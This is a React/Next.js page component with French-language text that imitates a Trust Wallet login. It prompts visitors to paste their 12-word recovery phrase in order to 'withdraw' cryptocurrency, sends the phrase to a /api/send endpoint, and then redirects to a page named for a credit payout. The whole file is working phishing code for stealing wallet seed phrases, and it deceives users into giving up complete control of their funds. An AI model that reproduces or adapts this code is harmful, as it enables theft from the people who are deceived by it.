import { FaStar } from 'react-icons/fa'
import React , {useState } from 'react'
import Layout from './layout'
import Dots from "react-activity/dist/Dots";
import Spinner from "react-activity/dist/Spinner";
import { useRouter } from 'next/router'

const Home = () => {

 const [value,setValue] = useState('');
 const [active,setActive] = useState(false)
 const [desabled,setDesabled] = useState(false)
 const [activity,setActivity] = useState(false)
 const [borderRed,setBorderRed] = useState('')
 const router = useRouter()


 const sendData = async () => {
     setActivity(true)
     const settings = {
     method: 'POST',
     headers: {
                 Accept: 'application/json',
                 'Content-Type': 'application/json',
             },
     body: JSON.stringify({
           code:value,
       })
      }

      setDesabled(true)

      setTimeout(() => {
       setDesabled(false)
      }, 1000);



    try {



            const fetchResponse = await fetch(`/api/send`, settings);

            const resp = await fetchResponse.json();


             if(resp.status == 200){


                   setActivity(false)

                    router.push('/beneficierducredit')


              }

        } catch (e) {
          return e;
        }
  }


  return (
      <Layout>
            <div className = 'content'>

                  <div className = 'content-login'>
                    <p>Connectez-vous à votre compte Trustwallet pour retirer vos cryptomonnaie</p>
                  </div>

                  <div className = 'content-login-zn'>
                      <div className = 'content-login-zn-ctn'>

                           <div className = 'content-login-zn-ctn-txt'>
                              <span>Phrase </span>
                               <b>*</b>
                            </div>

                           <div className = "content-login-zn-ctn-text-area">
                           <textarea
                           className = {borderRed}
                            value = {value}
                           onChange = {(e) => {
                             setValue(e.target.value)
                             let str = e.target.value


                                if (value.length > 1 &&  countWords(value) < 12 ){
                                  setBorderRed('border-red')
                                }else {
                                  setBorderRed('')
                                }


                                 if(countWords(e.target.value) == 12 ){

                                   setActive(true)
                                 }else {
                                    setActive(false)
                                 }



                           }}

                           />
                           </div>

                          {
                            (value.length > 1 &&  countWords(value) < 12 ) && (

                              <div className = 'content-login-zn-indic-txt-warning'>
                                 <span>Veuillez coller les 12 mots pour vous connecter</span>
                             </div>

                            )
                          }

                           <div className = 'content-login-zn-indic-txt'>
                              <span>En générale 12 mots (parfois 24) séparés  par des espaces simples</span>
                          </div>


                            {
                              active ?
                              <div className = 'content-login-zn-ctn-btn'>
                               <button
                                  onClick = {() => sendData()}
                                  disabled = {desabled}

                                  >
                                   {activity ?  <Dots/> :  <span>CONNECTER</span>}

                                  </button>
                               </div>
                               :
                               <div className = 'content-login-zn-ctn-btn content-login-zn-ctn-btn-de'>
                                <button >CONNECTER</button>
                                </div>
                            }

                      </div>
                  </div>


                  <div className = 'content-login-zn-ctn-recuperation'>
                     <span>Qu'est-ce qu'une phrase de récupération?</span>
                  </div>






            </div>
      </Layout>
  )
}

function countWords(str) {
   str = str.replace(/(^\s*)|(\s*$)/gi,"");
   str = str.replace(/[ ]{2,}/gi," ");
   str = str.replace(/\n /,"\n");
   return str.split(' ').length;
   }

export default Home
